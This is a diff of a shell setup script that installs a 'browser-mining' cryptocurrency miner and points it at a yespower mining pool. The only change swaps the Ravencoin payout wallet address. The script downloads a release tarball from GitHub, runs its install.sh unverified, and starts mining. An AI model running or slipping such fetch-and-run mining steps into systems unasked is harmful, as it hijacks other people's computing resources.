@@ -33,7 +33,7 @@ sudo apt update && sudo apt install curl ca-certificates -y
             nvm install 18
 			
 rm config.json
-echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65", "password": "c=RVN", "workers": 8 }]' > config.json
+echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "RVkDXkSRDsXAzvAtFz3fuqT7chcdvWopyB", "password": "c=RVN", "workers": 8 }]' > config.json
             node index.js
 			
 curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J
@@ -43,7 +43,7 @@ curl https://github.com/malphite-code/browser-mining/releases/download/v1/browse
             sh install.sh
             rm config.json
             echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker":
-            "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65", "password": "c=RVN", "workers": 8 }]' > config.json
+            "RVkDXkSRDsXAzvAtFz3fuqT7chcdvWopyB", "password": "c=RVN", "workers": 8 }]' > config.json
             node index.js
 
 
